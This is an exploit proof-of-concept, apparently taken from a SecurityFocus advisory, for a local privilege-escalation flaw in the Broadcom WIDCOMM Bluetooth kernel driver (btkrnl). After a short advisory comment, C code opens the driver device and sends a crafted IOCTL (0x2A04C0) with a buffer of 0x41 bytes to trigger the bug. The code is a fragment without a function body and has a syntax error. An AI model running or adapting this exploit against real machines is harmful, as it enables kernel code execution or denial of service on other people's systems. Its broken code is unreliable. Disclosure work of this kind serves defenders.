/*
source: http://www.securityfocus.com/bid/56124/info

Broadcom WIDCOMM Bluetooth is prone to a local privilege-escalation vulnerability.

A local attacker may exploit this issue to gain escalated privileges and execute arbitrary code with kernel privileges. Failed exploit attempts may result in a denial-of-service condition.

Broadcom WIDCOMM Bluetooth 5.6.0.6950 is vulnerable; other versions may also be affected. 
*/

HANDLE   hDevice;
    char *inbuff, *outbuff;
    DWORD ioctl, len,;
 
    if ( (hDevice = CreateFileA("\\\\.\\btkrnl",
                                              0,
                                              0,
                                              0,
                                              OPEN_EXISTING,
                                              0,
                                              NULL) ) != INVALID_HANDLE_VALUE )
    {
            printf("Device succesfully opened!\n");
    }
    else
    {
            printf("Error: Error opening device \n");
            return 0;
    }
    inbuff = (char*)malloc(0x12000);
    if(!inbuff){
            printf("malloc failed!\n");
            return 0;
    }
    outbuff = (char*)malloc(0x12000);
    if(!outbuff){
            printf("malloc failed!\n");
            return 0;
    }
        ioctl = 0x2A04C0;
        memset(inbuff, 0x41, 0x70);    
        DeviceIoControl(hDevice, ioctl, (LPVOID)inbuff, 0x70, (LPVOID)outbuff, 0x70, &len, NULL);